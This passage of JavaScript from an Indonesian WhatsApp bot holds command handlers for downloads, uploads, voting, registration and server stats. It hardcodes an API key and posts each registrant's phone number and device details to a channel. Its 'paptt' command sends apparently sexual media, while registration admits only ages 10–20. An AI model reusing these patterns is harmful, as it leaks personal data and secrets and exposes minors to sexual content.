}
break
//================================================================================
//==============================================
//case 'instagram': case 'igdl': case 'ig': case 'igvideo': case 'igimage': case 'igvid': case 'igimg': {
	 // if (!text) return replyviex(`Anda perlu memberikan URL video, postingan, reel, gambar Instagram apa pun`)
	  //TradzSigma.sendMessage(m.chat, { react: { text: `⏱️`, key: m.key }})
//try {
        //const data = await fetchJson(`https://api.neekoi.me/api/igdl?url=${encodeURIComponent(text)}`);
        //if (data && data.result && data.result.length > 0) {
        //  let sudahDikirim = false; 
          //  for (const item of data.result) {
             // if (sudahDikirim) break;
               // const hasil = item.url;
               // const cap = `Ini dia kak🔥`;
               // if (hasil.includes('dst-jpg') || hasil.includes('.jpg') || hasil.includes('.jpeg') || hasil.includes('image')) {
                    //await TradzSigma.sendMessage(m.chat, { 
                       // image: { url: hasil }, 
                      //  caption: cap 
                 //   }, { quoted: m });
                   // sudahDikirim = true;
             //   } else {
                   // await TradzSigma.sendMessage(m.chat, { 
                //        video: { url: hasil }, 
            //            caption: cap 
                   // }, { quoted: m });
             //   } 
           // }
        //} else {
          //  await TradzSigma.sendMessage(m.chat, { text: 'Maaf, media tidak ditemukan.' }, { quoted: m });
        //}
   // } catch (error) {
       // console.error('Gagal fetch media IG:', error);
      //  await TradzSigma.sendMessage(m.chat, { text: 'Terjadi kesalahan saat mengambil media.' }, { quoted: m });
    //}
case 'snackvideo': {
  if (!text) return replyviex(mess.query.link)
  replyviex(mess.query.link)
const data = fetchJson(`https://api.alyachan.dev/api/snackvideo?url=${encodeURIComponent(text)}&apikey=DinzIDgembul`)
const vidnya = data.data.url;
const cption = "nih kak"
TradzSigma.sendMessage(m.chat, { caption: cption, video: { url: vidnya } }, { quoted: m });
}
break
case 'ghstalk': case 'githubstalk':{
if (!q) return replyviex(`Contoh ${prefix+command} DGXeon`)
TradzSigma.sendMessage(m.chat, { react: { text: `⏱️`, key: m.key }})
aj = await githubstalk.githubstalk(`${q}`)
TradzSigma.sendMessage(m.chat, { image: { url : aj.profile_pic }, caption: 
`*/ Github Stalker \\*

Username : ${aj.username}
Nickname : ${aj.nickname}
Bio : ${aj.bio}
Id : ${aj.id}
Nodeid : ${aj.nodeId}
Url Profile : ${aj.profile_pic}
Url Github : ${aj.url}
Type : ${aj.type}
Admin : ${aj.admin}
Company : ${aj.company}
Blog : ${aj.blog}
Location : ${aj.location}
Email : ${aj.email}
Public Repo : ${aj.public_repo}
Public Gists : ${aj.public_gists}
Followers : ${aj.followers}
Following : ${aj.following}
Created At : ${aj.ceated_at}
Updated At : ${aj.updated_at}` }, { quoted: m } )
}
break
//=================================================
case 'sewa':
case 'sewabot': {
    let hostingbsc = `
  *SEWA BOT JINSHI-MD*

*🥉PRICE PAKET SEWA BIASA🥉*

> ⭔  RP 3.000 ( 2 HARI ) 
> ⭔  RP 4.000 ( 3 HARI ) 
> ⭔  RP 8.000 ( 5 HARI ) 
> ⭔  RP 10.000 (  1 MINGGU ) 
> ⭔  RP 15.000 (  2 MINGGU ) 
> ⭔  RP 20.000 (  1 BULAN ) 
> ⭔  RP 30.000 (  PERMANEN ) 

*🌠 PRICE PAKET SEWA PREMIUM 🌠*

> ⭔  RP 20.000 ( 1 BULAN ) 
> ⭔  RP 25.000 ( 2 BULAN ) 
> ⭔  RP 35.000 ( PERMANEN ) 

*🎗 PRICE PAKET SEWA UNLIMITED 🎗*

> ⭔  RP 40.000  ( PERMANEN ) 
> ⭔  RP 45.000 ( PERMANEN + PREMIUM ) 

*🥉𝙻𝚒𝚜𝚝 𝙿𝚊𝚔𝚎𝚝 𝚂𝚎𝚠𝚊 𝙱𝚒𝚊𝚜🥉*
> ᴊᴀɢᴀ ɢʀᴏᴜᴘ  
> ɢᴀᴍᴇ sᴇʀᴜ  
> ᴀɴᴛɪʟɪɴᴋ ɢᴄ ʟᴀɪɴ  
> ᴀɴᴛɪ ᴘʀᴏᴍᴏsɪ

━━━━━━━━━━━━━━━━━━
*💎𝙻𝚒𝚜𝚝 𝙿𝚊𝚔𝚎𝚝 𝙿𝚛𝚎𝚖𝚒𝚞𝚖💎*
> ᴊᴀɢᴀ ɢʀᴏᴜᴘ  
> ɢᴀᴍᴇ sᴇʀᴜ  
> ᴀɴᴛɪʟɪɴᴋ ɢᴄ ʟᴀɪɴ  
> ᴀɴᴛɪ ᴘʀᴏᴍᴏsɪ  
> ʀᴇǫᴜᴇsᴛ ғɪᴛᴜʀ  
> ᴀᴅᴍɪɴ ᴍᴇɴᴅᴀᴘᴀᴛᴋᴀɴ ᴘʀᴇᴍɪᴜᴍ  
> ᴡᴇʟᴄᴏᴍᴇ ᴋᴇᴄᴇ

━━━━━━━━━━━━━━━━━━
*🏆𝙻𝚒𝚜𝚝 𝙿𝚊𝚔𝚎𝚝 𝚂𝚎𝚠𝚊 𝚄𝚗𝚕𝚒𝚖𝚒𝚝𝚎𝚍 🏆*
> ᴊᴀɢᴀ ɢʀᴏᴜᴘ  
> ɢᴀᴍᴇ sᴇʀᴜ  
> ᴀɴᴛɪʟɪɴᴋ ɢᴄ ʟᴀɪɴ  
> ᴀɴᴛɪ ᴘʀᴏᴍᴏsɪ  
> ʀᴇǫᴜᴇsᴛ ғɪᴛᴜʀ  
> ᴀᴅᴍɪɴ ᴍᴇɴᴅᴀᴘᴀᴛᴋᴀɴ ᴘʀᴇᴍɪᴜᴍ  
> ᴡᴇʟᴄᴏᴍᴇ ᴋᴇᴄᴇ  
> ʟɪᴍɪᴛ ᴜɴʟɪᴍɪᴛᴇᴅ  
> ᴜɴʟᴏᴄᴋ sᴇᴍᴜᴀ ғɪᴛᴜʀ [ ᴛᴇʀᴍᴀsᴜᴋ ᴏᴡɴᴇʀ ]
> ᴅᴀᴘᴀᴛ ᴜᴘᴅᴀᴛᴇ ʟᴇʙɪʜ ᴄᴇᴘᴀᴛ

━━━━━━━━━━━━━━━━━━
🏮 *Cara Pembayaran:*  
Silakan hubungi owner atau Ketik : *.owner*

🚀 *PAYMENT OWNER💰*  
> Qris
> Pulsa +3k
> Gopay
⛩️ *Jangan ragu, kami juga memiliki testimoni!!*
`
await TradzSigma.sendMessage(m.key.remoteJid, {
        image: { url: global.thumbnail },
        caption: hostingbsc,
        footer: '©TradzID',
        buttons: [
            {
                buttonId: '.owner',
                buttonText: {
                    displayText: 'CLICK TO CHAT OWNER'
                },
                type: 1
            }
        ],
        headerType: 1,
        viewOnce: true
    }, { quoted: fsaluran });
}
            break
            case 'unreg':
            case 'unregis':
case 'unregister': {
    const serialUser = createSerial(20);
    const umurUser = q.substring(q.lastIndexOf('.') + 1);
    const success = removeRegisteredUser(m.sender);
    if (success) {
        replyviex(`✅ Kamu berhasil unregistered dan datamu telah dihapus.\n\n├⎆ *Status:*  _*Unregister ✔*_\n├⎆ *Name:* ${pushname}\n├⎆ *Device:* ${deviceinfo}\n\n⟢ *SN:* ${serialUser}\n⟢ *Date* ${tanggal}`);
    } else {
        replyviex('⚠️ Kamu belum terdaftar.');
    }
}
break;

        case 'daftar':
case 'register':
case 'regis': {
    if (global.registeredUsers.find(u => u.jid === m.sender)) return replyviex('Kamu sudah terdaftar.');

    const serialUser = createSerial(20);
    const umurUser = q.substring(q.lastIndexOf('.') + 1);
    const nomor = m.sender.split('@')[0];

    if (!umurUser || isNaN(umurUser)) return replyviex('Format umur tidak valid. Contoh: .daftar.15');
    if (umurUser > 20) return replyviex(`Maximal umur 20 untuk melakukan register`);
    if (umurUser < 10) return replyviex(`Umur kamu belum cukup untuk melakukan registrasi`);

    const operator = detectOperator(nomor.replace(/[^0-9]/g, '').replace(/^62/, '0').slice(0, 12));
    const channelJid = `${global.idSaluran}`; // ID Saluran

    const mzd = `╭───• *NEW USER* •───
├⎆ *Status:*  _*Success ✓*_
├⎆ *Name:* ${pushname}
├⎆ *Umur:* ${umurUser}

⟢ *SN:* ${serialUser}
⟢ 𝗗𝗮𝘁𝗲: ${new Date().toLocaleString()}

_Sekarang anda sudah bisa mengakses Jinshi MD_
`;

    const notifLog = `REGISTERED USERS
Nomor     : @${nomor}
Nama      : ${pushname}
Umubr     : ${umurUser}
Status     : Sukses✅
Serial      : ${serialUser}
Operator   : ${operator}
Device     : ${deviceinfo}

_Sekarang anda sudah jadi bagian kami_
`;

    let ppuser;
    try {
        ppuser = await TradzSigma.profilePictureUrl(m.sender, 'image');
    } catch {
        ppuser = 'https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460960720.png?q=60';
    }

    addRegisteredUser(m.sender, pushname, umurUser, serialUser);

    TradzSigma.sendMessage(m.chat, {
        text: mzd,
        contextInfo: {
            mentionedJid: [m.chat],
            externalAdReply: {
                showAdAttribution: true,
                title: 'Register succes ✓',
                body: '© Jinshi Md - 2025',
                thumbnailUrl: 'https://files.catbox.moe/nrtcjf.jpeg',
                sourceUrl: 'https://whatsapp.com/channel/0029Vb5tjub8F2p55FXaN80p',
                mediaType: 1,
                renderLargerThumbnail: true
            }
        }
    });

    TradzSigma.sendMessage(channelJid, {
        text: notifLog,
        contextInfo: {
            mentionedJid: [m.sender],
            externalAdReply: {
                title: 'System Notification',
                body: 'Notification Register',
                thumbnailUrl: ppuser,
                sourceUrl: 'https://www.youtube.com/@TradzID',
                mediaType: 1,
                renderLargerThumbnail: false
            }
        }
    });
}
break;

case 'ngl':
            case 'sendngl': {
                if (!text) return replyviex(`*Masukan command!*\n\nContoh:\n${prefix + command} https://ngl.link/xxxxxxxx AKU SAYANG KAMU`)
                if (!budy.match('https://ngl.link/')) return replyviex(`Contoh:\n${prefix + command} https://ngl.link/denakhtar1 hallo`)
                let [usersi, ...message] = text.split(' ');
                let userr = usersi.split('https://ngl.link/')[1]
                message = message.join(' ');
                let ngl = await axios.post("https://ngl.link/api/submit",
                    `username=${userr}&question=${message}&deviceId=18d7b980-ac6a-4878-906e-087dfec6ea1b&gameSlug=&referrer=`
                );
                m.reply(`*Pesan terkirim 👍*

*ID:* ${ngl.data.questionId}
*Region:* ${ngl.data.userRegion}
`)
                if (!isCreator && !isPremium) {
                    db.data.users[m.sender].limit -= 1
                }
            }
            db.data.users[m.sender].exp += await randomNomor(20)
            break
        case 'tourl': {
				if (!mime) return replyviex(`Kirim/Reply Video/Gambar Dengan Caption ${prefix + command}`);
				TradzSigma.sendMessage(m.chat, { react: { text: "⏳️",key: m.key,}})
				try {
					let media = await TradzSigma.downloadAndSaveMediaMessage(quoted);
					if (/image|video/.test(mime)) {
						let response = await CatBox(media);
						let fileSize = (fs.statSync(media).size / 1024).toFixed(2);
						let uploadDate = new Date().toLocaleString();
						let uploader = `${pushname}`;
						let caption = `> ᴜᴋᴜʀᴀɴ ғɪʟᴇ : ${fileSize} ᴋʙ\n> ᴘᴇɴɢᴜɴɢɢᴀʜ : ${uploader}`.trim();
						let msg = generateWAMessageFromContent(
    m.chat,
    {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            body: {
              text: `*sᴜᴅᴀʜ sᴇʟᴇsᴀɪ ${pushname} sɪʟᴀʜᴋᴀɴ ᴅɪᴄᴏᴘᴘʏ ʟɪɴᴋɴʏᴀ*`
            },
            carouselMessage: {
              cards: [
                {
                  header: proto.Message.InteractiveMessage.Header.create({
                    ...(await prepareWAMessageMedia({ image: {url:'./library/data/media/Tradz.jpg'} }, { upload: TradzSigma.waUploadToServer })),
                    title: '',
                    gifPlayback: true,
                    subtitle: global.ownername,
                    hasMediaAttachment: false
                  }),
                  body: { text: caption },
                  nativeFlowMessage: {
                    buttons: [
                  {
                    "name": "cta_copy",
                    "buttonParamsJson": `{\"display_text\":\"Click to get link\",\"id\":\"123456789\",\"copy_code\":\"${response}\"}`
                  },
                ],
                  },
                },
                ],
				messageVersion: 1,		
			    },
			     },
        },
      },
    },
    { quoted: m}
  );

  await TradzSigma.relayMessage(msg.key.remoteJid, msg.message, {
    messageId: msg.key.id,
  });
					} else if (!/image/.test(mime)) {
						let response = await CatBox(media);
						replyviex(response);
					} else {
						replyviex(`Jenis media tidak didukung!`);
					}
					await fs.unlinkSync(media);
				} catch (err) {
					console.log(err);
					replyviex("Ups, terjadi kesalahan saat mengunggah media. Coba lagi ya! 😅");
				}
			}
			break
//=================={{=[===================]]\\
case 'tourl2': {
async function uploadwidipe(poto) {
  const axios = require("axios");
const fs = require("fs");
const FormData = require("form-data");
const path = require('path');
    try {
      const mime = require('mime-types');
  const form = new FormData();
  const contentType = mime.lookup(poto);
  const fileName = path.basename(poto);
  form.append('file', fs.createReadStream(poto), {
    contentType: contentType || 'application/octet-stream',
    filename: fileName,
  });
      const response = await axios.post('https://cdn.elxyzgpt.xyz/', form, {
        headers: form.getHeaders(),
        onUploadProgress: (progressEvent) => {
          if (progressEvent.lengthComputable) {
            console.log(`🚀 Upload Progress: ${(progressEvent.loaded * 100) / progressEvent.total}%`);
          }
        }
      });
    const hasilnya = response.data.fileUrl
      console.log('🎉 File Upload Success:', response.data);
      return hasilnya;
    } catch (error) {
      console.error('🚫 Upload Failed:', error);
      reject(error);
    }
}
  try {
    const media = await TradzSigma.downloadAndSaveMediaMessage(quoted);
    const anuu = await uploadwidipe(media);
    replyviex(`📮 *L I N K :*
${anuu}
📊 *S I Z E :* ${media.length} Byte
📛 *E x p i r e d :* No Expiry Date`);
    await fs.unlinkSync(media);
  } catch (error) {
    console.error('Error:', error);
    replyviex('Error uploading file.');
  }
}
  break;
//=================================================================
//=================================================================
case 'ocr': {
  if (!quoted) return replyviex(`mana fotonya kak?`)
  TradzSigma.sendMessage(m.chat, { react: { text: `⏱️`, key: m.key }})
  const media = await TradzSigma.downloadAndSaveMediaMessage(quoted)
const anuu = await UploadFileUgu (media)
	const data = await fetchJson(`https://api.alyachan.dev/api/ocr?image=${anuu.url}&apikey=DinzIDgembul`)
	const textnya = data.data.text
	replyviex(`${textnya}`)
}
break
case 'tozombie':
case 'jadizombie': {
  if (!quoted) return replyviex(`mana fotonya kak?`)
  replyviex(mess.wait)
  const media = await TradzSigma.downloadAndSaveMediaMessage(quoted)
const anuu = await UploadFileUgu (media)
	const data = await fetchJson(`https://widipe.com/tools/jadizombie?url=${anuu.url}`)
	const zombie = data.result
	TradzSigma.sendMessage(m.chat, { image: { url: zombie }, caption: `_Sukses Membuat ${command}_`}, { quoted: m})
}
break
case 'join': {
if (!TradID) return replyviex(mess.only.owner)
if (!text) return replyviex(`Contoh ${prefix+command} linkgc`)
if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) return replyviex('Link Invalid!')
let result = args[0].split('https://chat.whatsapp.com/')[1]
await TradzSigma.groupAcceptInvite(result)
await replyviex(`sukses kak`)
}
break
case 'poll': {
	if (!TradID) return replyviex(mess.only.owner)
            let [poll, opt] = text.split("|")
            if (text.split("|") < 2)
return await replyviex(
`Sebutkan pertanyaan dan minimal 2 pilihan\nContoh: ${prefix}poll Siapa admin terbaik?|Dinz,Asep,Doge...`
)
            let options = []
            for (let i of opt.split(',')) {
options.push(i)
            }
            await TradzSigma.sendMessage(m.chat, {
poll: {
name: poll,
values: options
}
            })
        }
        break
        case 'vote': {
            if (!m.isGroup) return replyviex(mess.only.group)
            if (m.chat in vote) return replyviex(`_Masih ada suara di chat ini!_\n\n*${prefix}deletevote* - untuk menghapus suara`)
            if (!text) return replyviex(`Masukkan Alasan Memilih, Contoh: *${prefix + command} Pemilik Tampan*`)
            replyviex(`Pemungutan suara dimulai!\n\n*${prefix}upvote* - untuk upvote\n*${prefix}downvote* - untuk downvote\n*${prefix}checkvote* - untuk memeriksa suara\n*${prefix} deletevote* - untuk menghapus suara`)
            vote[m.chat] = [q, [], []]
            await sleep(1000)
            upvote = vote[m.chat][1]
            devote = vote[m.chat][2]
            teks_vote = `* VOTE *

*Reason:* ${vote[m.chat][0]}

┌〔 UPVOTE 〕
│ 
├ Total: ${vote[m.chat][1].length}
│
│ 
└────

┌〔 DOWNVOTE 〕
│ 
├ Total: ${vote[m.chat][2].length}
│
│ 
└────

Please Type Below
*${prefix}upvote* - to cast vote
*${prefix}downvote* -  to downvote
*${prefix}deletevote* - to delete vote`
            TradzSigma.sendMessage(m.chat, {text: teks_vote}, {quoted:m})
	    }
            break
               case 'upvote': {
            if (!m.isGroup) return replyviex(mess.only.group)
            if (!(m.chat in vote)) return replyviex(`_*tidak ada voting di grup ini!*_\n\n*${prefix}vote* - untuk memulai voting`)
            isVote = vote[m.chat][1].concat(vote[m.chat][2])
            wasVote = isVote.includes(m.sender)
            if (wasVote) return replyviex('You have Voted')
            vote[m.chat][1].push(m.sender)
            menvote = vote[m.chat][1].concat(vote[m.chat][2])
            teks_vote = `* VOTE *

*Reason:* ${vote[m.chat][0]}

┌〔 UPVOTE 〕
│ 
├ Total: ${vote[m.chat][1].length}
${vote[m.chat][1].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
│ 
└────

┌〔 DOWNVOTE 〕
│ 
├ Total: ${vote[m.chat][2].length}
${vote[m.chat][2].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
│ 
└────

Please Type Below
*${prefix}upvote* - to upvote
*${prefix}downvote* -  to downvote
*${prefix}deletevote* - to delete vote`
            TradzSigma.sendMessage(m.chat, {text: teks_vote, mentions: menvote}, {quoted:m})
	    }
             break
case 'downvote': {
            if (!m.isGroup) return replyviex(mess.only.group)
            if (!(m.chat in vote)) return replyviex(`_*no voting in this group!*_\n\n*${prefix}vote* - to start voting`)
            isVote = vote[m.chat][1].concat(vote[m.chat][2])
            wasVote = isVote.includes(m.sender)
            if (wasVote) return replyviex('You have Voted')
            vote[m.chat][2].push(m.sender)
            menvote = vote[m.chat][1].concat(vote[m.chat][2])
            teks_vote = `* VOTE *

*Reason:* ${vote[m.chat][0]}

┌〔 UPVOTE 〕
│ 
├ Total: ${vote[m.chat][1].length}
${vote[m.chat][1].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
│ 
└────

┌〔 DOWNVOTE 〕
│ 
├ Total: ${vote[m.chat][2].length}
${vote[m.chat][2].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
│ 
└────

Please Type Below
*${prefix}upvote* - to upvote
*${prefix}downvote* -  to downvote
*${prefix}deletevote* - to delete vote`
            TradzSigma.sendMessage(m.chat, {text: teks_vote, mentions: menvote}, {quoted:m})
	}
            break
 
case 'checkvote':
if (!m.isGroup) return replyviex(mess.only.group)
if (!(m.chat in vote)) return replyviex(`_*no voting in this group!*_\n\n*${prefix}vote* - to start voting`)
teks_vote = `* VOTE *

*Reason:* ${vote[m.chat][0]}

┌〔 UPVOTE 〕
│ 
├ Total: ${upvote.length}
${vote[m.chat][1].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
│ 
└────

┌〔 DOWNVOTE 〕
│ 
├ Total: ${devote.length}
${vote[m.chat][2].map((v, i) => `├ ${i + 1}. @${v.split`@`[0]}`).join('\n')}
│ 
└────

*${prefix}deletevote* - to delete votes


©${TradzSigma.user.id}
`
TradzSigma.sendTextWithMentions(m.chat, teks_vote, m)
break
		case 'deletevote': case 'delvote': case 'hapusvote': {
            if (!m.isGroup) return replyviex(mess.only.group)
            if (!(m.chat in vote)) return replyviex(`_*no voting in this group!*_\n\n*${prefix}vote* - to start voting`)
            delete vote[m.chat]
            replyviex('Successfully Deleted Vote Session In This Group')
	    }
            break
case 'toonce': case 'toviewonce': { 
if (!quoted) return replyviex(`Reply Image/Video`)
TradzSigma.sendMessage(m.chat, { react: { text: `⏱️`, key: m.key }})
if (/image/.test(mime)) {
anuan = await TradzSigma.downloadAndSaveMediaMessage(quoted)
TradzSigma.sendMessage(m.chat, {image: {url:anuan}, caption: `Ini dia!!`, fileLength: "999", viewOnce : true},{quoted: m })
} else if (/video/.test(mime)) {
anuanuan = await TradzSigma.downloadAndSaveMediaMessage(quoted)
TradzSigma.sendMessage(m.chat, {video: {url:anuanuan}, caption: `Ini dia!!`, fileLength: "99999999", viewOnce : true},{quoted: m })
}
}
break
case 'fliptext': {
if (args.length < 1) return replyviex(`Contoh:\n${prefix}fliptext ${ownername}`)
quere = args.join(" ")
flipe = quere.split('').reverse().join('')
replyviex(`\`\`\`「 FLIP TEXT 」\`\`\`\n*•> Normal :*\n${quere}\n*•> Flip :*\n${flipe}`)
}
break
case 'get': {
				if (!/^https?:\/\//.test(text)) return replyviex('*Masukan URL nya!*\n\nContoh:\n.get https://api.vreden.my.id/api/ytmp3?url=https://youtube.com/watch?v=YBnxAP6qst4');
				try {

					const data = await axios.get(text);
					const contentType = data.headers["content-type"];

					if (contentType.startsWith('image/')) {
						TradzSigma.sendMessage(m.chat, {
							image: {
								url: text
							},
							caption: `${text}\n\n*Headers Respons:*\n${Object.entries(data.headers).map(([key, value]) => `*${key}:* ${value}`).join('\n')}`
						}, {
							quoted: m
						});
					} else if (contentType.startsWith('video/')) {
						TradzSigma.sendMessage(m.chat, {
							video: {
								url: text
							},
							caption: `${text}\n\n*Headers Respons:*\n${Object.entries(data.headers).map(([key, value]) => `*${key}:* ${value}`).join('\n')}`
						}, {
							quoted: m
						});
					} else if (contentType.startsWith('audio/')) {
						TradzSigma.sendMessage(m.chat, {
							audio: {
								url: text
							},
							mimetype: 'audio/mpeg'
						}, {
							quoted: m
						});
					} else {
						m.sendForward(util.format(data.data))
						let button = [{
							"name": "quick_reply",
							"buttonParamsJson": `{\"display_text\":\"Save File\",\"id\":\".get2 ${text}\"}`
						}]
						TradzSigma.sendButtonText(m.chat, button, "*Ingin menyimpan?*", bots.footer, m)
					}
				} catch (error) {
					 
				}
			}
			break;
case 'paptt': {
  if (!isPrem) return replyprem(mess.premium)

  global.paptt = [
    "https://telegra.ph/file/5c62d66881100db561c9f.mp4",
    "https://telegra.ph/file/a5730f376956d82f9689c.jpg",
    "https://telegra.ph/file/8fb304f891b9827fa88a5.jpg",
    "https://telegra.ph/file/0c8d173a9cb44fe54f3d3.mp4",
    "https://telegra.ph/file/b58a5b8177521565c503b.mp4",
    "https://telegra.ph/file/34d9348cd0b420eca47e5.jpg",
    "https://telegra.ph/file/73c0fecd276c19560133e.jpg",
    "https://telegra.ph/file/af029472c3fcf859fd281.jpg",
    "https://telegra.ph/file/0e5be819fa70516f63766.jpg",
    "https://telegra.ph/file/29146a2c1a9836c01f5a3.jpg",
    "https://telegra.ph/file/85883c0024081ffb551b8.jpg",
    "https://telegra.ph/file/d8b79ac5e98796efd9d7d.jpg",
    "https://telegra.ph/file/267744a1a8c897b1636b9.jpg",
  ];

  let url = paptt[Math.floor(Math.random() * paptt.length)];
  let ext = url.split('.').pop();

  let msgType = ext === 'mp4' ? 'video' : 'image';

  await TradzSigma.sendMessage(m.chat, {
    [msgType]: { url },
    caption: 'Tch, dasar sangean'
  }, { quoted: m });
}
break;

 case 'alkitab':{ 
     if (!text) return replyviex( `uhm.. teksnya mana?\n\ncontoh:\n${prefix + command} kejadian`)
     let res = await axios.get(`https://alkitab.me/search?q=${encodeURIComponent(text)}`, { headers: { "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36" } }) 
  
     let $ = cheerio.load(res.data) 
     let result = [] 
     $('div.vw').each(function (a, b) { 
         let teks = $(b).find('p').text().trim() 
         let link = $(b).find('a').attr('href') 
         let title = $(b).find('a').text().trim() 
         result.push({ teks, link, title }) 
     }) 
 
   let foto = 'https://telegra.ph/file/a333442553b1bc336cc55.jpg'
   let judul = '*────────「 Alkitab 」 ────────*'
     let caption = result.map(v => `💌 ${v.title}\n📮 ${v.teks}`).join('\n┄┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┈┄\n') 
      TradzSigma.sendFile(m.chat, foto, 'alkitab.jpg', `${judul}\n\n${caption}`, m)
 } 
break
            case 'listpc': {
 let anulistp = await store.chats.all().filter(v => v.id.endsWith('.net')).map(v => v.id)
 let teks = `${themeemoji} *PERSONAL CHAT LIST*\n\nTotal Chat : ${anulistp.length} Chat\n\n`
 for (let i of anulistp) {
 let nama = store.messages[i].array[0].pushName
 teks += `${themeemoji} *Name :* ${nama}\n${themeemoji} *User :* @${i.split('@')[0]}\n${themeemoji} *Chat :* https://wa.me/${i.split('@')[0]}\n\n────────────────────────\n\n`
 }
 TradzSigma.sendTextWithMentions(m.chat, teks, m)
             }
             break
case 'listgc': {
 let anulistg = await store.chats.all().filter(v => v.id.endsWith('@g.us')).map(v => v.id)
 let teks = `${themeemoji} *GROUP CHAT LIST*\n\nTotal Group : ${anulistg.length} Group\n\n`
 for (let i of anulistg) {
 let metadata = await TradzSigma.groupMetadata(i)
 teks += `${themeemoji} *Name :* ${metadata.subject}\n${themeemoji} *Owner :* ${metadata.owner !== undefined ? '@' + metadata.owner.split`@`[0] : 'Unknown'}\n${themeemoji} *ID :* ${metadata.id}\n${themeemoji} *Made :* ${moment(metadata.creation * 1000).tz('Asia/Kolkata').format('DD/MM/YYYY HH:mm:ss')}\n${themeemoji} *Member :* ${metadata.participants.length}\n\n────────────────────────\n\n`
 }
 TradzSigma.sendTextWithMentions(m.chat, teks, m)
             }
             break
             case 'ping':
            case 'speed':
            case 'speed-bot': {
                if (!isRegistered) return replydaftar('👋 Halo kak, anda belum bisa mengakses bot nih daftar dulu ya.\n\n╭──「 \`CARA DAFTAR\` 」─✦\n│⦿ 〔 Cara : .daftar nama.umur\n│⦿ 〔 Contoh : .daftar TradzID.20\n│⦿ 〔 Botname : JinshiMD✨\n╰───────────────────✦\n\nDENGAN DAFTAR KAMU BISA AKSES BOT SEPUASNYA\n\n💂‍♀: Kenapa harus daftar sih?\n🍁: Agar bot mengenal siapa anda\n💂‍♀: Ribet banget harus daftar segala\n🍁: Jika tidak daftar, Anda tidak bisa menggunakan fitur bot')
                const used = process.memoryUsage();
                const cpus = os.cpus().map(cpu => {
                    cpu.total = Object.keys(cpu.times).reduce((last, type) => last + cpu.times[type], 0)
                    return cpu
                })
                const cpu = cpus.reduce((last, cpu, _, {
                    length
                }) => {
                    last.total += cpu.total
                    last.speed += cpu.speed / length
                    last.times.user += cpu.times.user
                    last.times.nice += cpu.times.nice
                    last.times.sys += cpu.times.sys
                    last.times.idle += cpu.times.idle
                    last.times.irq += cpu.times.irq
                    return last
                }, {
                    speed: 0,
                    total: 0,
                    times: {
                        user: 0,
                        nice: 0,
                        sys: 0,
                        idle: 0,
                        irq: 0
                    }
                })
                let omaditt = hitungmundur(1, 1, 2026);
                let timestamp = speed();
                let latensi = speed() - timestamp;
                let neww = performance.now();
                let tio = await nou.os.oos();
                let oldd = performance.now();
                var tot = await nou.drive.info();
                let respon = `*JARINGAN SERVER*
- Ping: ${latensi.toFixed(4)} _Second_ 

*INFO SERVER*
- OS: ${tio}
- VPS: ${runtime(os.uptime())}
- Type OS: ${nou.os.type()}

*RAM :*
- Total: ${formatp(os.totalmem())}
- Digunakan: ${formatp(os.totalmem() - os.freemem())}

*PENYIMPANAN :*
- Total: ${tot.totalGb} GB
- Digunakan: ${tot.usedGb} GB (${tot.usedPercentage}%)
- Tersedia: ${tot.freeGb} GB (${tot.freePercentage}%)

*RUNTIME SERVER*
Aktif:
${runtime(process.uptime())}

*CPU USAGE (${cpus.length} CORE CPU)*
${cpus[0].model.trim()} (${cpu.speed} MHZ)\n${Object.keys(cpu.times).map(type => `- *${(type + '*').padEnd(6)}: ${(100 * cpu.times[type] / cpu.total).toFixed(2)}%`).join('\n')}

> © TradzSigma🤷‍♂`.trim();
                let imgso = `https://quickchart.io/chart?v=2.9.4&c=%7B%0A%20%20type%3A%20%27doughnut%27%2C%0A%20%20data%3A%20%7B%0A%20%20%20%20datasets%3A%20%5B%0A%20%20%20%20%20%20%7B%0A%20%20%20%20%20%20%20%20data%3A%20%5B${tot.freePercentage}%2C%20${tot.usedPercentage}%5D%2C%0A%20%20%20%20%20%20%20%20backgroundColor%3A%20%5B%27%2326AC00%27%2C%20%27red%27%5D%2C%0A%20%20%20%20%20%20%20%20label%3A%20%27Dataset%201%27%2C%0A%20%20%20%20%20%20%20%20borderWidth%3A%200%2C%0A%20%20%20%20%20%20%7D%2C%0A%20%20%20%20%5D%2C%0A%20%20%20%20labels%3A%20%5B%27A%27%2C%20%27C%27%5D%2C%0A%20%20%7D%2C%0A%20%20options%3A%20%7B%0A%20%20%20%20circumference%3A%20Math.PI%2C%0A%20%20%20%20rotation%3A%20Math.PI%2C%0A%20%20%20%20cutoutPercentage%3A%2075%2C%0A%20%20%20%20layout%3A%20%7B%0A%20%20%20%20%20%20padding%3A%2080%2C%0A%20%20%20%20%7D%2C%0A%20%20%20%20legend%3A%20%7B%0A%20%20%20%20%20%20display%3A%20false%2C%0A%20%20%20%20%7D%2C%0A%20%20%20%20plugins%3A%20%7B%0A%20%20%20%20%20%20datalabels%3A%20%7B%0A%20%20%20%20%20%20%20%20color%3A%20%27%23404040%27%2C%0A%20%20%20%20%20%20%20%20anchor%3A%20%27end%27%2C%0A%20%20%20%20%20%20%20%20align%3A%20%27end%27%2C%0A%20%20%20%20%20%20%20%20formatter%3A%20(val)%20%3D%3E%20val%20%2B%20%27%25%27%2C%0A%20%20%20%20%20%20%20%20font%3A%20%7B%0A%20%20%20%20%20%20%20%20%20%20size%3A%2025%2C%0A%20%20%20%20%20%20%20%20%20%20weight%3A%20%27bold%27%2C%0A%20%20%20%20%20%20%20%20%7D%2C%0A%20%20%20%20%20%20%7D%2C%0A%20%20%20%20%20%20doughnutlabel%3A%20%7B%0A%20%20%20%20%20%20%20%20labels%3A%20%5B%0A%20%20%20%20%20%20%20%20%20%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20text%3A%20%27%5CnPing%20Status%27%2C%0A%20%20%20%20%20%20%20%20%20%20%20%20font%3A%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%2